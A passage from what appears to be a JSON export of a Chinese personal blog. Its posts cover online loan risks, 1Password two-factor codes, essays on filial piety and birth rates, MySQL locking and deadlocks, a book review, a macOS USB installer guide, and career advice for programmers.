当然，我是强烈不建议碰各种小的网贷平台，另外如果是通过借钱拿去消费买奢侈品这种做法是非常不理性的。为什么不要碰网贷平台，原因是利息高，还存在各种隐藏的服务费啊什么的，非常不划算，另外就是借的钱一定要按时还款，如果不按时还款，正规的机构都是会报上央行征信系统的，会影响日后的生活，比如买房啊之类的人银行一看你信用有问题可能就拒绝给你批贷款。甚至如果还不上还会被暴力催收，骚扰你的亲戚朋友，让你的名声受损。 比如最近国民 APP 抖音、知乎上就各种现金贷的广告，我念一段广告词啊！ 12女：你知道还呗吗？男：知道啊，我信用分 700 分，可以贷款 20 万，看着是我买的新车，帅气吧！ 看完我的三观都被毁了，没钱贷款买车还挺得意，虽说公司出于商业目的接这些广告无可厚非，但是这些贷款平台将目标放在抖音这种年轻人群体的 APP 中是有原因的，一方面玩抖音的大多数都是 18-30 岁出头的三四线年轻人，另一方面，他们没有成熟的消费观念和理财观念，他们分不清哪些是资产哪些是负债，并且缺钱还容易被新鲜事物迷惑，喜欢超前消费，如果被误导，会导致这些年轻人年纪轻轻就背巨额贷款，到头来拆东墙补西墙，最后还得他们的父母拿出养老钱去帮助他们还款，并且误了年轻人的前程，甚至影响征信(频繁查询征信或者频繁使用这些现金贷款业务会让银行认为你很缺钱，不敢把钱借给你)，对工作和生活造成不可估量的损失。最恶劣的情况还有可能出现刑事案件，影响社会稳定。 这些年轻人本来就没钱，本就不应该通过商业消费贷款去大手大脚的消费，但是事实上却是很多年轻人并没有这种能力，却还要被这些商业机构收割一波韭菜。 如果是别人问我借钱，不按时还，我会直接把这个人拉进黑名单！","categories":[],"tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"https://awen.me/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}]},{"title":"使用 1password 的一次性密码替代 authy","slug":"使用-1password-的一次性密码替代-authy","date":"2019-05-17T13:59:26.000Z","updated":"2021-02-26T06:05:29.301Z","comments":true,"path":"posts/58766.html","link":"","permalink":"https://awen.me/posts/58766.html","excerpt":"","text":"一般来说，只要一个网站能够开启两步验证，我都会给他开了，原因是我不相信密码，哪怕他在复杂，而通过两步验证，多了一道防护，至少我心理作用看会比较放心（其实被黑还是有可能呢） 而最开始我使用 google authentication 但是这货不这支持同步，而且换个手机就没法用了。 后来我就一字使用 authy，这个软件可以跨平台同步，但是每次我都要先用 1password 填充密码登录，然后在打开这个软件去复制一次性密码过来粘贴，很麻烦。 而我一直发现 1password 提示我有些网站需要开两步验证，但是这些网站我都有开的，而 1password 居然提示要求我去打开两步验证，于是我好奇的搜了下，发现原来 1password 本身就支持配置两步验证，并且功能超级好用，比 authy 省事多了。 首先，编辑某个密码，然后选择一次性密码，当你选择后会有个二维码的标识 把这个窗口拖到你网页开启两步验证的二维码处，会自动识别二维码的内容，然后保存 这个时候就可以看到对应的密码选项中多了一个动态密码了，你可以主动去点后面的复制按钮复制 但是，更多的时候你在使用 1password 登录一个已经配置了两步验证的网站时候，程序会在填充账号密码后自动把两步验证的密码复制到粘贴板， 你直接粘贴即可登录。非常方便。","categories":[],"tags":[{"name":"1password","slug":"1password","permalink":"https://awen.me/tags/1password/"}]},{"title":"传统社会为什么会有养儿防老","slug":"传统社会为什么会有养儿防老","date":"2019-05-16T12:27:19.000Z","updated":"2021-02-26T06:05:29.300Z","comments":true,"path":"posts/55237.html","link":"","permalink":"https://awen.me/posts/55237.html","excerpt":"","text":"有一年过年的时候，我父亲送我去车站，然后跟我聊天说让我早点结婚生娃，我记得很清楚，他跟我说“人为什么要结婚，为什么要生孩子，就是为了养儿防老，传宗接代”，我突然发现我是他养老的工具。 我说我对你这套东西不care，然后被他说我比他还思想还落后。 一直以来，中国的传统社会都有一些现在看起来很反人类的文化，比如“养儿防老”，“重男轻女”，“贞操文化”，“三纲五常”“血亲文化”等等，这些东西都是在限制人的自由，其实这些东西的背后都是一套儒家给统治阶级开出的一道药方，我们一一道来。 今天，看《陈志武的金融学通识课》里面关于传统养儿防老方面的解释似乎解了我的疑惑。 为什么会有养儿防老在没有货币的社会里，人会被当成一种财富的载体，而不是自由选择权利的人，例如非洲部落会把羊和女儿当成财富的象征，谁羊和女人多谁最成功，如果女人多了怎么办，可以用100头羊来换一个女人。而古代中国会把女人拿来贩卖，尤其是灾荒之年，你看电视机里面父母把女儿卖去做婢女，卖到青楼或把儿子送到宫里当太监。 资料显示徽州富商家里的资产表里面记录了一条花了10两银子买了一个婢女。 养儿防老本质上是一种跨期价值交换，就是用今天的钱去投资，等未来你在把收益给我。就好比今天的养老金和保险，而古代金融产品少，并且金融产品要让对方有信任感，比如你今天你缴纳养老保险，因为你信任国家这个载体，相信国家到你老了会给你发养老金，而古代没有这些东西，更别提建立信任了，那会又没有大数据和现如今的科技，所以儒家就搞出了一套孝文化，从思想上给人洗脑，达到控制人的目的。 儒家是这样规范这套体系保证其可行的，首先，靠血缘关系建立信任，并配合“仁义礼智信”的行为规范，包括：孝道、礼道、妇道等等，通过这些把不孝的风险降到最低。可是仅仅有这些还不够，因此儒家通过“仁”和“正名”来保证这套体系可以顺利运转 所谓“正名”就是每个人都有自己的名分，并履行自己的职责，也就是“君君臣臣父父子子”这个名分会跟着你一生，比如在家从父，出嫁从夫，夫死从子”一旦每个人的义务和关系确定了，“养儿防老”这套体系就建立了交易的链条。从今天的角度看，子女就是古代社会里面的“保险”，“基金”等理财产品。 为什么会有贞操古代都要求女子守妇道，还有很多朝代通过给妇女颁发贞节牌坊，其目的也是为了巩固“养儿防老”这套体系，如果女子不守妇道跟其他男人发生了关系生了孩子，丈夫就可能不认这个儿子，如果这个事情多了，会影响孝文化，而男权社会，丈夫如果出轨，可以通过一些方式把私生子纳入宗法体系里，因此古代不守贞操而失贞的女子会被逐出家门或浸猪笼和处死。而反之则会颁发贞节牌坊授予贞洁烈女称呼，但是仅仅是称呼没有实物奖励。这是因为跨期交易对信任要求太高，需要防范对方“逃跑”和“违约”。由于只要儿子是你亲生的，他就跑不掉，在辅以“三纲五常”，会让人放心。 为什么只认血亲因为血亲的关系是不可变的，是天生的，这种永恒性是人与人之间跨期交易所需要的。是“养儿防老”的基础，以确定性对抗不确定性。一个社会越是以人为金融工具，避险工具，就会越依赖血缘关系这种原始的因素。中国人会认为你是我儿子，你就必然爱我，跟我最亲，我也必然爱你，但是会看淡交流、相互尊重对感情深化所起的作用。这也是为什么一些家庭父亲对子女威严和不交流。而在发达国家子女甚至可以直呼父母的名字，强调平等关系。随着金融市场的发展，人类可以走出“血亲至上”的传统价值观，不在只认血亲而是重视后天交流。 为什么父母要包办婚姻其实父母包办婚姻本质还是为了解决“养儿防老”，因为除了血亲关系之外， 夫妻关系就是最正宗的亲情关系了。由于古代没有很好的金融产品来替代父母养老，因此父母就会通过包办婚姻促成两家的联姻，本质上是为了解决家庭因为各种变故带来的损失。而这样的就造成了现在的各种相亲只看脸和家庭条件。有的家里女儿多，其父母会把女儿许配给不同职业以及不同地理位置的人以达到分散风险的作用。 什么时候养儿防老会消失当人类不再需要儿子也可以把老年生活过的非常有质量时，养儿防老就退出历史舞台了。其实现如今子女常年在外读书或就业，已经是潜在的“逃跑”了，因此养儿防老终将退出历史舞台。但是如果经济下滑，统治阶层还是会把这套东西搬出来的。 儒家有没有用自从汉朝罢黜百家，独尊儒术开始至今，儒家文化对于中国传统文化影响非常深远，至今你仍可以在马路牙子上看到各种孝文化以及仁义礼智信的宣传。 这是因为这套体系对于统治阶级稳定的管理社会有非常重要的价值。有研究表明在清朝统治期间，山东收到儒家文化影响，即使是灾荒之年，农民暴动的概率也很低。然而儒家文化对个人约束太多，压制社会活力。 央视之前的采访，这背后说明在经济下行的情况下，我国老龄化、养老，已经成为了一个比较大的问题了。很多统治阶层不可理喻的行为和举动，其实只要你从维稳这个角度上来看，你就会知道他到底是想干嘛。比如鼓励妇女发挥在家庭中的作用，说这是中国传统优秀品德，其实并不是什么尊重传统文化，而是说明了中国经济下滑，很多人失业，统治阶层希望一部分女性返回家庭，这样能够腾出一部分就业岗位。比如这个讲要孝顺，不要违逆老人，也并不是什么为了爱护老人，或者是为了保护中国传统优秀文化，而是因为在经济下行的情况下，老龄化已经开始成为了一个问题，年轻人赡养老人的压力过大，所以提倡孝顺。 如果经济景气，统治阶层才不会去提倡什么传统美德，经济越不景气，统治阶层越会拿一些传统的什么价值观说事。因为要维稳，经济不景气，年轻人赡养老人压力太大，如果因此都不赡养老人，那整个社会会出现大动荡，所以统治阶层才会提倡什么孝顺，尽管在我们看来，这是顽固不化、迂腐的愚孝，但其实在统治阶层看来，这是有实际意义的。 朱熹搞出来的家族宗祠制度宗祠，即祠堂、宗庙、祖庙、祖祠，是供奉祖先和祭祀场所，是我国儒家传统文化的象征。宗祠制度产生于周代，上古时代，士大夫不敢建宗庙，宗庙为天子专有。 而宋代朱熹提倡家族祠堂：每个家族建立一个奉祀高、曾、祖、祢四世神主的祠堂四龛。祠堂是族权与神权交织中心。 家族宗祠的出现使得儒家这套体系不在是高高在上的政治工具，而是把儒家思想文化演化成一个个实体建筑与人们的生活紧密联系在一起。其目的也是为了保证“养儿防老”这套能够一袋一代的传承下去。所以这也是是传宗接代的由来。 为什么只嫁或卖女儿而不是儿子这个其实还是和古代的儒家文化有关，一直以来都代代相传女子是嫁出去的女儿泼出去的水，男子是家里的顶梁柱，未来的家庭继承人，所以女子会自然而然的认为自己未来是别人家的妻子，为其他男人传宗接代的，因此女儿女儿不会反抗，而男子则男子会因为一直以来都被认为是家里的继承人，会有抵触情绪，比如古代上门女婿这类一般男的过去都不会过的太好，原因就是这个，因此男子不利于养儿防老这套的稳定持续传承。 我对孝顺的理解我觉得可以孝，但不能顺，有的父母的思想观念已经落后于时代了，也没什么眼界，顺从他们的意思只会让自己在社会上吃亏以及无法立足，但是这个孝是建立在互相理解和尊重的前提下的，而不是一方把自己看成是一家之主就蛮横不讲合理的唯我独尊，又不会与子女沟通交流，只会打骂子女，这样的家长是非常不合格的，更有甚者是一些父母非但帮不上子女的忙，反而还各种添乱，比如苏大强这类父亲，自己没什么本事，还各种要求，这种父母应该早点远离，不要来往。 我对养老的理解年轻时自己努力攒钱攒能力，提升自己的见识，自己给自己养老，而不是靠子女，例如保险+养老基金+社保都配上，从年轻的时候就开始储蓄，子女应该是一种感情上的陪伴和沟通交流，而不是理财工具。","categories":[],"tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"https://awen.me/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}]},{"title":"深入理解 Mysql 的锁","slug":"深入理解-Mysql-的锁","date":"2019-05-16T01:58:54.000Z","updated":"2021-02-26T06:05:29.346Z","comments":true,"path":"posts/46037.html","link":"","permalink":"https://awen.me/posts/46037.html","excerpt":"","text":"数据库锁的设计初衷是为了解决并发问题，根据加锁的范围，可以分为全局锁、表级锁和行锁。 全局锁顾名思义，全局锁就是对整个数据库实例加锁，执行 1flush tables with read lock (FTWRL) 之后其他线程的以下语句会被阻塞：更新语句(增删改)、数据定义语句(建表、修改表结构)和更新类事务的提交语句 全局锁的典型使用场景是 做全库逻辑备份，也就是把整个库的每个表都 select 出来存成文本。 全局锁的弊端 如果在主库备份，那么备份期间不能更新，业务会中断 如果在从库备份，备份期间从库不能执行主库同步过来的，会导致主从延迟 mysqldump 使用参数–single-transaction 的时候 导数据库之前就会启动一个事务，来确保拿到一致性视图，而由于 MVCC 的支持，这个过程中数据库是可以正常更新的。那为什么有了这个功能还需要全局锁呢？因为一致性读是好，但是前提需要引擎支持这个隔离级别，MyISAM 不支持这种事务引擎，如果备份过程中有更新，总是只能取到最新的数据，那么就破坏了备份的一致性。 为什么不用 set global readlonly= truereadonly 是可以让全库进入只读状态，但是： 有些系统，readonly 的值会被用来做其他逻辑，比如判断一个库是主库还是备库。修改 变量的影响更大。 在异常处理机制上，如果只选FTWRL，由于客户端异常，MYSQL 会自动释放这个全局锁，整个库回到可以正常更新的状态，而设置为readonly 之后，则会一直是 readonly 状态，会导致库一直处于不可写状态。 表级锁表级锁分为，表锁和元数据锁(meta data lock，MDL) 表锁表锁的语法是 lock tables… read/write，与FTWRL 类似，可以用 unlock tables 主动释放 也可以客户端断开后自动释放。lock tables语法除了限制别的线程的读写外，还限制本线程的一些操作。 举个例子, 如果在某个线程 A 中执行 lock tables t1 read, t2 write; 这个语句，则其他线程写 t1、读写 t2 的语句都会被阻塞。同时，线程 A 在执行 unlock tables 之前，也只能执行读 t1、读写 t2 的操作。连写 t1 都不允许，自然也不能访问其他表。 在还没有出现更细粒度的锁的时候，表锁是最常用的处理并发的方式。而对于InnoDB这种支持行锁的引擎，一般不使用 lock tables命令来控制并发，毕竟锁住整个表的影响面还是太大。另一类表级的锁是 MDL（metadata lock)。MDL不需要显式使用，在访问一个表的时候会被自动加上。MDL 的作用是，保证读写的正确性。你可以想象一下，如果一个查询正在遍历一个表中的数据，而执行期间另一个线程对这个表结构做变更，删了一列，那么查询线程拿到的结果跟表结构对不上，肯定是不行的。 MDL另一类表级的锁是 MDL（metadata lock)。MDL 不需要显式使用，在访问一个表的时候会被自动加上。MDL 的作用是，保证读写的正确性。你可以想象一下，如果一个查询正在遍历一个表中的数据，而执行期间另一个线程对这个表结构做变更，删了一列，那么查询线程拿到的结果跟表结构对不上，肯定是不行的。 mysql 5.5 以后的版本引入了 MDL，当对表做增删改查操作时，加MDL 读锁，当要对表做结构变更操作时，加MDL写锁。 读锁之间不互斥，因此你可以有多个线程同时对一张表增删改查。 读写锁之间、写锁之间是互斥的，用来保证变更表结构操作的安全性。因此，如果有两个线程要同时给一个表加字段，其中一个要等另一个执行完才能开始执行。 虽然 MDL 锁是系统默认加的，但是不能忽略这个机制，有时候给一个小表加字段，都有可能导致整个库挂掉。 例如表t 如下 我们可以看到 session A 先启动，这时候会对表 t 加一个 MDL 读锁。由于 session B 需要的也是 MDL 读锁，因此可以正常执行。 之后 session C 会被 blocked，是因为 session A 的 MDL 读锁还没有释放，而 session C 需要 MDL 写锁，因此只能被阻塞。 如果只有 session C 自己被阻塞还没什么关系，但是之后所有要在表 t 上新申请 MDL 读锁的请求也会被 session C 阻塞。前面我们说了，所有对表的增删改查操作都需要先申请 MDL 读锁，就都被锁住，等于这个表现在完全不可读写了。 如果某个表上的查询语句频繁，而且客户端有重试机制，也就是说超时后会再起一个新 session 再请求的话，这个库的线程很快就会爆满。 事务中的 MDL 锁，在语句执行开始时申请，但是语句结束后并不会马上释放，而会等到整个事务提交后再释放。 如何安全的给小表加字段首先我们要解决长事务，事务不提交，就会一直占着 MDL 锁。在 MySQL 的 information_schema 库的 innodb_trx表中，你可以查到当前执行中的事务。如果你要做DDL变更的表刚好有长事务在执行，要考虑先暂停 DDL，或者 kill 掉这个长事务。 如果是一个热点表，虽然数据量不大，但是请求很频繁，这时候kill可能未必管用，因为新的请求马上就来了。比较理想的机制是，在altertable语句里面设定等待时间，如果在这个指定的等待时间里面能够拿到 MDL 写锁最好，拿不到也不要阻塞后面的业务语句，先放弃。之后开发人员或者DBA再通过重试命令重复这个过程。 MariaDB 已经合并了 AliSQL 的这个功能，所以这两个开源分支目前都支持 DDL NOWAIT/WAIT n 这个语法。 12ALTER TABLE tbl_name NOWAIT add column ...ALTER TABLE tbl_name WAIT N add column ... 行锁顾名思义，就是对某一行进行加锁，比如事务 A 更新了一行，而这时候事务 B 也要更新同一行，则必须等事务 A 的操作完成后才能进行更新。 两阶段锁在 InnoDB 事务中，行锁是在需要的时候才加上的，但并不是不需要了就立刻释放，而是要等到事务结束时才释放。这个就是两阶段锁协议。 如果你的事务中需要锁多个行，要把最可能造成锁冲突、最可能影响并发度的锁尽量往后放。 死锁和死锁检测当并发系统中不同线程出现循环资源依赖，涉及的线程都在等待别的线程释放资源时，就会导致这几个线程都进入无限等待的状态，称为死锁。 如图所示，事务 A 在等待事务 B 释放 id=2 的行锁，而事务 B 在等待事务 A 释放 id=1 的行锁。 事务 A 和事务 B 在互相等待对方的资源释放，就是进入了死锁状态。当出现死锁以后，有两种策略： 一种策略是，直接进入等待，直到超时。这个超时时间可以通过参数 innodb_lock_wait_timeout 来设置。 另一种策略是，发起死锁检测，发现死锁后，主动回滚死锁链条中的某一个事务，让其他事务得以继续执行。将参数 innodb_deadlock_detect 设置为 on，表示开启这个逻辑。 在 InnoDB 中，innodb_lock_wait_timeout的默认值是50s，意味着如果采用第一个策略，当出现死锁以后，第一个被锁住的线程要过50s才会超时退出，然后其他线程才有可能继续执行。对于在线服务来说，这个等待时间往往是无法接受的。 但是，我们又不可能直接把这个时间设置成一个很小的值， 比如1s。这样当出现死锁的时候，确实很快就可以解开，但如果不是死锁，而是简单的锁等待呢?所以，超时时间设置太短的话，会出现很多误伤。 所以，正常情况下我们还是要采用第二种策略，即:主动死锁检测，而且innodb_ deadlock_ detect的默认值本身就是on。主动死锁检测在发生死锁的时候，是能够快速发现并进行处理的，但是它也是有额外负担的。 比如同时更新一条记录，频繁更新，就需要频繁检测，死锁检测会消耗大量的CPU 资源。 解决死锁检测的方案一种头痛医头的方法，就是如果你能确保这个业务一定不会出现死锁，可以临时把死锁检测关掉。 但是这种操作本身带有一定的风险，因为业务设计的时候一般不会把死锁当做一个严重错误，毕竟出现死锁了，就回滚，然后通过业务重试一般就没问题了，这是业务无损的。而关掉死锁检测意味着可能会出现大量的超时，这是业务有损的。 另一个思路是控制并发度。 根据上面的分析，你会发现如果并发能够控制住，比如同一行同时最多只有 10 个线程在更新，那么死锁检测的成本很低，就不会出现这个问题。一个直接的想法就是，在客户端做并发控制。但是，你会很快发现这个方法不太可行，因为客户端很多。我见过一个应用，有 600 个客户端，这样即使每个客户端控制到只有 5 个并发线程，汇总到数据库服务端以后，峰值并发数也可能要达到 3000。 因此，这个并发控制要做在数据库服务端。如果你有中间件，可以考虑在中间件实现；如果你的团队有能修改 MySQL 源码的人，也可以做在 MySQL 里面。基本思路就是，对于相同行的更新，在进入引擎之前排队。这样在 InnoDB 内部就不会有大量的死锁检测工作了。 第三个方案就是修复逻辑 你可以考虑通过将一行改成逻辑上的多行来减少锁冲突。还是以影院账户为例，可以考虑放在多条记录上，比如 10 个记录，影院的账户总额等于这 10 个记录的值的总和。这样每次要给影院账户加金额的时候，随机选其中一条记录来加。这样每次冲突概率变成原来的 1/10，可以减少锁等待个数，也就减少了死锁检测的 CPU 消耗。 这个方案看上去是无损的，但其实这类方案需要根据业务逻辑做详细设计。如果账户余额可能会减少，比如退票逻辑，那么这时候就需要考虑当一部分行记录变成 0 的时候，代码要有特殊处理。","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"https://awen.me/tags/mysql/"}]},{"title":"读《钓愚》后感","slug":"读《钓愚》后感","date":"2019-05-15T11:20:30.000Z","updated":"2021-02-26T06:05:29.357Z","comments":true,"path":"posts/55181.html","link":"","permalink":"https://awen.me/posts/55181.html","excerpt":"","text":"《钓愚：操纵与欺骗的经济学》 是美国诺贝儿经济学获奖者乔治·阿克洛夫写的一本通俗经济学读物，这本书通过大量的案例阐述了人在自由经济市场中的是不理性的，会被商家通过各种人性弱点来钓愚，诱导参与不理性的消费行为。 比如超市里面鸡蛋和牛奶都是摆在最里面的，用户在走进超时会被商家的各种促销活动所吸引，本来是想买鸡蛋，但是结算的时候却发现购物车多了一堆本不在购物计划之外的东西。 再比如一些特殊节日人们的消费行为会由理性被感性所替代，从而购买一些物非所值的无盘，比如情人节的花、结婚纪念日内的消费等等。 商家还会通过人民的信任来出售劣质产品，比如银行利用人民的信任出售信用评级很差的垃圾债务以及劣质商品，例如三鹿奶粉事件。 此外，各种信用卡、医疗保健、航班贵宾服务、会员制度以及各种理财产品和房地产都是商家精心设计的钓愚手段，目的是要让顾客掏腰包，甚至在政治领域，例如美国所谓的民主选举选民也是在被操控。 任何经济体内都存在欺骗，一旦发现人的弱点，就会迅速展开欺骗，把超额的利润装入自己的口袋。","categories":[],"tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"https://awen.me/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}]},{"title":"Mac 制作 U盘 启动盘","slug":"Mac-制作-U盘-启动盘","date":"2019-05-14T20:09:45.000Z","updated":"2021-02-26T06:05:29.259Z","comments":true,"path":"posts/30651.html","link":"","permalink":"https://awen.me/posts/30651.html","excerpt":"","text":"制作镜像1.准备一个大于8G的U盘 2.下载固件，和以往一样，苹果官方不再提供 macOS Mojave 的 dmg 格式镜像文件。如需进行全新的抹盘安装，你只能下载 Mojave 的安装程序。通过 App store 下载macOS Mojave 3.写入U盘 1sudo &#x2F;Applications&#x2F;Install\\ macOS\\ Mojave.app&#x2F;Contents&#x2F;Resources&#x2F;createinstallmedia --volume &#x2F;Volumes&#x2F;Mojave &#x2F;Applications&#x2F;Install\\ macOS\\ Mojave.app --nointeraction 安装系统1.开启按住 command","categories":[],"tags":[{"name":"Mac","slug":"Mac","permalink":"https://awen.me/tags/Mac/"}]},{"title":"程序员，如何避免能力陷阱","slug":"程序员，如何避免能力陷阱","date":"2019-05-13T05:36:23.000Z","updated":"2021-02-26T06:05:29.349Z","comments":true,"path":"posts/9069.html","link":"","permalink":"https://awen.me/posts/9069.html","excerpt":"","text":"这里的能力指的就是你的专业能力，比如我们程序员这个职业，最擅长的就是写代码，我们很乐于去做那些我们擅长的事，于是就会一直去做，最终就使得我们会一直擅长那些事。做得越多，就越擅长，越擅长就越愿意去做。这样的一个循环能让我们在这方面获得更多的经验，但却容易陷入能力陷阱，而在其他方面无法突破。 要知道，这个世界上没有任何一个行业会一直出于朝阳行业，这是经济规律所决定的，经济活动沿着经济发展的总体趋势所经历的有规律的扩张和收缩，这就叫经济周期，它分为几个阶段‎: ‎复苏、繁荣、衰退、萧条。没有一个行业逃脱的掉经济周期的规律。今天可能互联网行业朝气蓬勃，做程序员前景好，于是你就全身心投入进去了，然后“两耳不闻窗外事，一心只想撸代码。” 时间久了，你可能会成为一名非常优秀的专业工程师，会专业范围内的各项技术原理非常深入，但是，你也仅仅只是一名工程师。因为你的格局太低了。 这个世界并非是由技术驱动的，而是由资本驱动的，每一次革新都是来自于其背后的资本在推动。只有烂程序员才相信世界是由技术驱动的。 我的一个朋友小丁，是一名Java 程序员，他们很喜欢写程序，有时候会熬夜赶需求，并且也非常上进，对于新技术的追求很敏感，你要跟他聊某个技术的，他能和你讲的头头是道，不过就是这样一名优秀的工程师，他总是和我抱怨公司给他开的薪水不符合他的预期，并且表示目前的工作有点枯燥无味，公司用的技术和框架都很老，学不到什么新技术了，他说公司年初希望他能够带个项目，做项目负责人，但是他拒绝了，他告诉他的主管，他只希望做一个程序员，不想做管理。原因是他觉得自己没有做管理的天赋，他拒绝了可能给他带来的一些改变，其实，如果做了管理，他的格局可能就不仅仅是只看某个业务逻辑写的合理不合理，完美不完美了，而是会从这个项目的全局去看问题，有可能会发现和提升其他方面的能力，从而提升自己的其他能力，比如领导能力、项目管理能力、沟通能力、组织协调能力等等。 我认识的另一个朋友，也是一名程序员，但是他除了技术很厉害以外，还担任核心研发部门的主管，并且公司还经常安排他去参加一些行业相关的会议，在此期间，他认识了很多其他领域的大牛，行业人脉十分的广泛，同时在一些会议中，他也经常发表一些演讲，有很多人对于程序员的印象都是死板的，但是他的演讲能力却十分的优秀。 在公司内部，他的组织协调能力、管理能力都得到管理层的认可，很快他就升职加薪，而且外部其他公司都在不停的开高薪挖他。 那么如何去做呢？首先，重新定义你的工作 不要仅仅局限于做自己手头的本职工作，可以尝试接触其他岗位的工作，这样可以让你的眼界和格局变大。 其次，如果有机会做管理，一定不要放弃这样的机会 当我们从事日常工作时，思考的是“如何才能让工作做得更好？”；而当我们做领导者的工作时，思考的是“我们应该做出一些什么样的改变？”。领导者们通常会跨越职能范围去展望未来，或是投入到一些没有即时利益的事情上。 第三，多与外界建立连接，打造良好的人际关系网络 认识和发现一些更优秀的人，不要仅仅局限于本行业的人。我们在人际交往中，出于“自恋原则”与“懒惰原则”，自然而然地会被那些与我们相似和地理位置相近的人吸引。因为我们需要依靠那些与自己相似的人，借此寻求安全感并获得肯定。而接触那些与自己地理位置相近的人，相对而言更轻松，不需要付出太多努力。 LinkedIn（领英）的创始人里德·霍夫曼曾经说过，扩展人际关系就像使用牙线清洁牙齿一样，一点也不好玩，但是很重要。领导者们利用人际关系网络感知发展趋势并寻找机会，与各领域的人才建立联系，跨领域合作以创造更多价值，避免陷入单一的、统一的群体性思维。借助这些拓展性关系，他们得以提出更多的突破性想法，并获取工作机会。 我们遥望着那些卓有成就的人，我们一边羡慕，一边却总认为自己缺乏能力，即使付出努力也未必获得成功，不如不做。儒学大师孔子对宰予的批评已经道出真相：“力不足者,中道而废,今汝画！”意思是：如果真的是能力不足的人，做到一半才会力不从心而放弃；你却根本没有开始，这不过是画地为牢罢了。 而改变，最佳的时机是现在，最佳方式是——去做。 我们要抓住那些可能给我们的职业和生活带来改变的变量，去行动，然后在行动中总结，这样才能成就更好的自己。 随便看一看那些优秀的程序员同时也是优秀的企业家，比如雷军、李彦宏、马化腾、周鸿祎一开始也都是普通的程序员，但是随着他们的认知和眼界的提升，他们的格局就和普通程序员不一样了。所以这些人更容易成功。 其实，所谓的提升自己，其实就是在不断升级自己的认知，拓宽自己的眼界。如果你只会写程序，那么你也仅仅是一个坐进观天之人。我们并不是都能成为上述优秀的企业家，但是我们可以成就优秀的自己。 很多人说程序员在30几岁会遭遇中年危机，其实如果尝试避开自己的能力陷阱，危机就不存在了。甚至还有可能成为行业内的香饽饽。 本文原创已授权 CSDN 程序人生独家发布，如需转载，请联系 CSDN 程序人生公众号","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"关于生娃，说点你不爱听的","slug":"关于生娃，说点你不爱听的","date":"2019-05-11T06:15:20.000Z","updated":"2021-02-26T06:05:29.314Z","comments":true,"path":"posts/52243.html","link":"","permalink":"https://awen.me/posts/52243.html","excerpt":"","text":"天下熙熙皆为利来有很多想不明白的事情，你往利这个字上面去看看就都明白了。为什么说利而不说钱，因为钱只是一种度量衡单位而已，小到家庭、大到国家，皆为利来，利去即散。比如一个统治阶级没有足够的让利百姓，反而与民争利，苛捐杂税的压榨老百姓，那么百姓就会造反。历朝历代的末期都是如此，一个公司，没有开够具有市场竞争力的薪资，员工就会离职。其他的价值观啊、道德感啊，都在利之下。 从这个角度看生娃不生娃这种事情，你就能明白为什么现在生育率这么低下了。因为老百姓被剥削割韭菜割的太狠了。 图画上说的很清楚了，因为地主资本家需要的是廉价劳动力，所以他们会拼命鼓吹早生儿子之类言论，目的是给被剥削阶级洗脑。可悲的是，很多吃地沟油的被剥削阶级，不仅意识不到自己所处的阶级地位，反而屁股站在资本家一边，被所谓的民族主义洗脑了。 其实古代女子结婚那么早，很大原因是因为皇权需要，最早的单身税可以追溯到汉朝，汉代承袭秦代的“编户齐民”，完善了人口登记制度，皇帝发现“人口就是税收啊”于是下令，对于晚婚的女子征收单身税，十五不嫁，赋税按正常的五倍算。到了晋代，女子十七不嫁，可以随便分配给单身汉。到了南北朝，女子15岁必须嫁出去，否则家人要坐牢到了北齐，女子十三就要嫁人，如果家里隐匿不报，处以极刑。而工业革命以后，新兴产业需要大量廉价劳动力，而农村剩余人口正好可以变成工人，政府可以从中获得诸多利好。自然要保障廉价劳动力的供应，也就是“人口红利” 直到现在，虔信19世纪经济学的保守政党非常执着地反对堕胎，甚至反对避孕，从经济学上解释就是，他们要确保穷人，也就是廉价劳动力的供应。一个没有做好准备的母亲和她的孩子，最容易成为穷人中的一员。这一切都是因为当权者的需要，所以，马云话糙理不糙啊，一个国家的发展离不开人，那就让那些精英去可劲的造孩子吧。 贫苦家庭生娃是造孽，越穷越生世世代代陷入死循环我始终认为特别穷的人是不适合生太多孩子(并不是不生，请量力而行)，是作孽。对于孩子是作孽，对于自己也是作孽。根本原因就是他们中大多数人所处的阶级是很难发生特别大的改变，他们无法提供给孩子良好的生活环境和教育，从他们的孩子一出生就落后于城市孩子，而现代城镇化进程，绝大多数优质的师资和资源都集中在大城市。有的农村学生十几年寒窗苦读，好不容易以为可以出人头地，可是等待他们的却是家底被掏空的在格子间里 996 挣那么一点微薄的薪水还房贷。而大多数农村家庭是没有能力抚养子女上完大学的。 当然，这其中会有一些幸运儿赶上时代的浪潮，翻了身，但是毕竟是幸存者偏差，大多数人还是外孙打灯笼————照旧和以前一样清苦的过完一生。 尤其是那些一生就生好几个的，真的是把女人当生育工具，把孩子当自己改变现状的一种投资手段。 这些人特别寄予厚望于自己的孩子望子成龙，希望孩子有个好的未来，乍一看好像很伟大，其实你想想他自己都没什么未来能给他的孩子什么未来？ 大多数农村父母自己没什么文化，也无法辅导孩子，眼界也不高，有的父母一辈子没出过远门，没在城里待过，很多父母自己也不思进取，业余时间除了麻将扑克也不会提升自己的能力，学个技能，但是牌九扑克却是玩的不亦乐乎。 年轻的时候只会选择去工厂打工或工地干苦力活，也没个一技之长。 他们就是笨鸟却不会先飞，而是生个蛋让蛋去飞的神操作和逻辑，他们的孩子从一出生就开始输在起跑线上，和城里的孩子根本没办法比，教育的背后其实都是大把大把的钞票堆起来的，然而他们最缺的就是钱，只能选择那些村里的公立学校，而他们最常对自己孩子说的话就是“没办法，谁让咱家穷，我们又没读过书”之类的话，潜台词就是你得靠自己，我帮不上你什么忙。其实这也不能全怪他们，他们也是受害者，他们也是被他们的父母影响的，而他们的父母哪一代更狠，本身就穷苦，没资源，还一生七八个，大多数都是头几胎一直是女娃，所以拼命的生，有的家里孩子养不活了就把孩子拿去送人，或者跟别人家换。这是典型的重男轻女思想。 